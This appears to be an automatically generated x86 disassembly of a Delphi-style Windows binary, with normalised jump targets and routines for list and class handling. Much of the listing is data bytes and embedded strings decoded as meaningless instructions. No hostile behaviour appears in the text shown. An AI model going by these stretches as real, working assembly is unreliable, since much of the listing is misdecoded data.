xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
cmovne eax [ ebx + 0x6f ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x7473694c
inc ebp
jb r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
fsubr [ ebp + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx + 0x100041 ] ch
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
adc [ ebp + 0x49 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0xc0041 ] bh
inc eax
add al al
xor [ eax ] al
nop
mov ah 0x40
add [ eax ] bl
xor [ eax ] eax
cmovne ecx [ edi + 0x75 ]
je r-xdata
jb r-xdata
imul esi [ ebx + esi * 2 + 0x45 ] 0x726f7272
nop
and al 0x14
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ edx ] cl
inc ebp
inc edx
add [ eax ] al
fsubr [ ebp + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add [ esp + edx + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ecx + eax * 2 ] dl
add [ eax + eax ] cl
push ss
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax + 0xc004137 ] dl
cmp [ ecx ] al
add eax 0x73694c54
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x74617265
imul ebp [ edi + 0x6e ] 0x159cc08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
jbe r-xdata
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx ] dl
inc ebp
push dx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0x15
inc ecx
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ss
inc ecx
add [ eax + eax ] ah
add [ eax ] al
mov al [ 0x70004010 ]
xor eax [ eax ]
jl r-xdata
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ edi + esi ] bh
inc ecx
add al ah
cmp [ ecx ] al
enter 0x413a 0x0
nop
aaa
inc ecx
add [ eax + edi ] cl
inc ecx
add [ 0x73694c54 ] al
dec ecx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x16
add [ eax ] al
mov al [ 0x70004010 ]
xor eax [ eax ]
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
adc eax 0x100041
jne r-xdata
insd
jo r-xdata
xor eax [ eax ]
shl [ eax ] 0x40
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ edi ] cl
inc ebp
inc ebx
outsd
adc al 0x41
add [ eax ] al
add [ eax ] al
push ss
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x39ffbeea ] bh
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x16 ] bl
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] ah
cmp eax [ ecx ]
or edx [ esp + edx * 2 + 0x68 ]
jb r-xdata
add [ eax ] al
arpl [ ebp + 0x73 ] sp
cmp al 0x15
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] cl
push esp
push eax
jb r-xdata
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
push ss
inc ecx
add [ eax + eax ] al
add [ eax ] al
mov al [ 0x70004010 ]
xor eax [ eax ]
jl r-xdata
push ss
inc ecx
add dh al
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ esp + edi + 0x54050041 ] dl
inc edx
imul esi [ ebx + esi * 2 - 0x75 ] 0x4116acc0
add [ eax ] al
add [ eax ] al
add al bl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0x70004010 ]
xor eax [ eax ]
jl r-xdata
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
push ss
add [ esi + 0x21 ] al
pop ss
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x179c0040 ] cl
imul esi [ ebx + 0x74 ] 0x8b746e65
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x3e ] cl
inc ecx
add [ eax + 0x3f ] bl
inc ecx
add [ eax + 0x3f ] ah
inc ecx
add [ esi + edi + 0x41 ] dh
add [ edx ] al
add bh bh
outsb
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x3e ] cl
inc ecx
add [ eax + 0x3f ] bl
inc ecx
add [ eax + 0x3f ] ah
inc ecx
add [ esi + edi + 0x41 ] dh
add [ eax + 0xe004140 ] ch
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] dl
inc eax
add [ eax + eax ] al
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
inc ecx
add [ 0x4117 ] ch
add [ eax ] al
add [ edi + edx + 0x17d80041 ] ch
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0xc004117 ] bh
imul esi [ ebx + 0x74 ] 0xac746e65
push ss
inc ecx
add ah dh
adc [ eax ] al
add [ eax ] al
pop es
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
lodsb [ esi ]
push ss
inc ecx
rcr al 0x16
inc ecx
add [ edi ] al
or edx [ eax + edx * 2 + 0x65 ]
jb r-xdata
and [ edi + 0x7da823d ] ch
jb r-xdata
inc ebx
insb
popad
jae r-xdata
sbb dl 0x7
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
add [ eax ] al
add [ eax + 0x16 ] ah
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ eax ] bl
inc eax
inc ecx
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esi 0xc004117
jae r-xdata
add [ eax ] dl
dec ebx
inc ecx
add [ ebx + ecx * 2 + 0x41 ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esi [ ebx + 0x74 ] 0xd8746e65
pop ss
inc ecx
add [ edi ] al
adc eax 0x746e4954
jb r-xdata
add [ ebp - 0x7c33ffc0 ] cl
inc esp
and al 0x4
clc
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
add [ eax ] al
add [ eax + 0x1a ] dl
inc ecx
add [ eax ] dh
add [ eax ] al
add [ eax + ebx ] bh
inc ecx
add [ eax + 0x33 ] dh
outsb
jae r-xdata
dec [ ebx + 0x411888c0 ]
add [ eax ] al
add bh bh
add [ esp + ecx * 2 + 0x4d340041 ] ch
dec ebx
inc ecx
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x41 ] bl
inc ecx
add [ eax + 0x3f ] bl
inc ecx
add [ eax - 0x77ffbebd ] dl
inc edx
inc ecx
add [ eax ] ch
sub [ eax ] eax
adc al 0x46
inc ecx
add [ eax ] ch
sub [ eax ] eax
sbb al 0x46
inc ecx
add [ esi + eax * 2 + 0x41 ] dh
add [ eax ] cl
sbb [ ecx ] eax
sub [ ecx ] bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bl
sbb [ ecx ] eax
adc [ eax ] al
add [ eax ] al
pushad
push ss
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
push ebx
inc ecx
add [ esp + edx * 2 + 0x41 ] al
add [ ecx * 2 + 0x54800041 ] dh
inc ecx
add ah dh
push esp
inc ecx
add [ eax ] bl
dec edi
inc ecx
add [ edi + ecx * 2 ] ah
inc ecx
add al dl
inc ecx
inc ecx
add al al
dec edi
inc ecx
add [ eax ] al
push eax
inc ecx
add [ eax + edx * 2 + 0x41 ] ch
add [ eax ] ah
inc esi
inc ecx
add ah bh
push ecx
inc ecx
add [ eax ] ch
dec eax
inc ecx
add ah bh
dec eax
inc ecx
add [ eax ] bh
push edx
inc ecx
add [ eax + 0x52 ] cl
inc ecx
add [ eax + 0x49 ] ah
inc ecx
add [ ecx + ecx * 2 + 0x4a600041 ] dh
inc ecx
add al bh
dec ebx
inc ecx
add [ eax + 0x4c ] dl
inc ecx
add ah ah
dec esp
inc ecx
add [ eax - 0x5bffbeb1 ] cl
dec edi
inc ecx
add [ edx + edx * 2 + 0x50ec0041 ] bl
inc ecx
add [ esp + edx * 2 + 0x54bc0041 ] ch
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ esi + ecx * 2 + 0x3f580041 ] bh
inc ecx
add ah dh
dec ebp
inc ecx
xor al 0x4d
sub [ ecx ] bl
inc ecx
add [ edi ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
sbb bl [ ecx ]
inc ecx
add [ eax ] dl
add [ eax ] al
add [ eax + 0x16 ] ah
imul esi [ ebx + 0x74 ] 0x9c746e65
pop ss
inc ecx
add ah dl
push ss
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ebp + edx * 2 + 0x41 ] al
imul ebp [ esi + 0x67 ] 0x7473694c
pushad
sbb al [ ecx ]
pop es
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
jo r-xdata
outsb
jae r-xdata
inc eax
add [ ebx + esi + 0x33780040 ] al
jae r-xdata
push ebx
popad
add [ eax - 0x57ffbeab ] dl
push ebp
inc ecx
add [ eax ] ch
sub [ eax ] eax
sub [ ecx ] ch
inc eax
add [ eax + 0x56 ] cl
inc ecx
add ah cl
inc esp
push ebp
inc ecx
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
and al 0x19
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
push ecx
inc ecx
add [ eax + 0x74004151 ] ah
inc esi
inc ecx
add [ ebx + edx * 2 ] dl
inc ecx
add [ eax + 0x53 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ esi + ecx * 2 + 0x41 ] bh
add [ eax - 0x53ffbebf ] cl
inc ecx
inc ecx
add al dl
inc ecx
inc ecx
add [ eax ] ch
sub [ eax ] eax
sub [ ecx ] ch
inc eax
add [ eax * 2 + 0x46200041 ] ch
inc ecx
add [ edi + eax * 2 + 0x48280041 ] bl
inc ecx
add ah bh
dec eax
inc ecx
add [ eax ] ch
sub [ eax ] eax
xor [ ecx + 0x41 ] cl
add [ eax + 0x49 ] ah
inc ecx
add [ ecx + ecx * 2 + 0x4a600041 ] dh
inc ecx
add al bh
dec ebx
inc ecx
add [ eax + 0x4c ] dl
inc ecx
add ah ah
dec esp
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + ebx ] al
inc ecx
add [ eax + eax ] cl
add [ eax ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
sbb [ ecx ] al
aam 0x16
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add [ eax + r-xdata ] dl
push ebx
je r-xdata
popad
insd
mov eax eax
mov eax 0x411b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
sbb eax [ ecx ]
or [ eax ] al
add [ eax ] al
hlt
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
inc esp
push ebp
inc ecx
add [ eax - 0x63ffbea7 ] cl
pop ecx
inc ecx
add [ ecx + ebx * 2 ] bh
inc ecx
add [ ecx + ebx * 2 + 0x41 ] cl
add [ eax + 0x56 ] cl
inc ecx
jb r-xdata
jae r-xdata
inc ecx
add [ eax - 0x77ffbebd ] dl
inc edx
inc ecx
add [ ecx + edx * 2 + 0x41 ] ah
dec esi
inc ecx
add [ eax + 0x3f ] bl
jae r-xdata
insd
dec ebp
popad
insd
sub al 0x1c
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c ] cl
inc ecx
add [ eax ] dl
add [ eax ] al
add [ edx + ebx + 0x33700041 ] al
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ ecx + ebx * 2 + 0x41 ] bl
add [ 0x6e614854 ] cl
insb
insd
inc eax
popad
add [ ebp + 0x1ad00040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
sbb al [ ecx ]
add al 0x0
add [ eax ] al
mov al [ 0x70004010 ]
xor eax [ eax ]
jl r-xdata
add [ ebx + 0x41194cc0 ] cl
add [ esi ] cl
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
jns r-xdata
push ebx
je r-xdata
insd
outsd
jb r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
inc esp
push ebp
inc ecx
add [ eax - 0x57ffbeab ] dl
push ebp
inc ecx
add [ eax + 0x2800415b ] bl
sub [ eax ] eax
rcr [ ebx + 0x41 ] 0x1
add ah cl
push esi
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
push esi
inc ecx
add [ edi ] al
push esp
push ebx
je r-xdata
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax - 0x63ffbeaf ] bl
nop
outsb
dec ecx
je r-xdata
inc esp
push ebp
inc ecx
je r-xdata
insd
popad
insd
test al 0x1c
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
sbb al 0x41
add [ eax + eax ] dl
add [ eax ] al
loopne r-xdata
int3
je r-xdata
sbb eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
sbb eax [ ecx ]
or [ eax ] al
add [ eax ] al
test [ edx ] bl
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
inc ebx
inc ecx
add [ eax + 0x64004142 ] cl
push ecx
inc ecx
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
mov eax 0x4119
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1a ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
outsd
popad
insd
mov eax eax
and al 0x1d
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1d ] al
inc ecx
add [ eax ] bl
add [ eax ] al
add al ah
sbb eax [ ecx ]
jo r-xdata
push ebx
push ebx
xor [ eax ] al
hlt
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
outsd
jb r-xdata
inc ecx
add ah cl
push esi
inc ecx
add ah al
pop esp
inc ecx
add [ 0x6d654d54 ] cl
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
pop ebx
inc ecx
add ah cl
push esi
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah dh
pop ebx
inc ecx
add [ ebp + edx * 2 + 0x41 ] al
add [ eax - 0x57ffbea4 ] bl
push ebp
inc ecx
add [ eax + 0x5000415b ] bl
pop ebp
inc ecx
add al dl
pop ebx
add [ eax - 0x57ffbeab ] dl
push ebp
inc ecx
add [ eax + 0xc00415b ] bl
pop edi
inc ecx
add al dl
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah dl
pop esi
inc ecx
add [ ebp + edx * 2 + 0x41 ] al
sub_411384
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_41245c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405cc8
pop edi
pop esi
pop ebx
retn
sub_412484
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405cac
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4124ac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405cd0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4124ec
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x25
inc ecx
add [ eax + eax ] dl
add [ eax ] al
mov al [ 0x70004010 ]
xor eax [ eax ]
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
push esi
push edi
push ebp
add esp 0xfffffff8
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x240041 ] cl
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add al dh
inc ecx
add [ ecx ] cl
push esp
push edx
inc edi
jb r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
and al 0x33
in eax dx
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
sub al [ ecx ]
or dl [ edx + edx * 2 + 0x65 ]
inc edi
jb r-xdata
mov [ esp + 0x4 ] edx
mov [ esp ] eax
jne r-xdata
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
nop
jne r-xdata
xor ebp ebp
add al 0x89
add al 0x24
add [ eax ] al
mov al [ 0x70004010 ]
xor eax [ eax ]
jl r-xdata
mov eax eax
mov [ 0x41 ] fs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ 0x240041 ] fs
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_4138b8
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403354
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403354
test al al
je r-xdata
in al dx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
jae r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_4125a4
mov esi eax
jmp r-xdata
shl [ eax ] 0x40
add ah bl
xor [ eax ] al
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4125a4
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403354
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4125a4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_4138b8
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403354
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403354
test al al
je r-xdata
sub_412604
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_4125a4
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4125a4
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403354
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_412674
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4030f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_41375c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_4126f0
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
mov eax [ esi + 0x4 ]
call sub_403128
mov eax [ esi + 0x8 ]
call sub_403128
mov eax [ esi + 0xc ]
call sub_403128
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_412730
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_4138b8
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_40308c
test al al
jne r-xdata
sub_412790
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_4138b8
mov edx eax
mov eax ebp
call sub_403354
test al al
jne r-xdata
sub_4127d4
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41286f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403078
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4040dc
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_412730
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41375c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412876
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov eax [ ebp - 0x4 ]
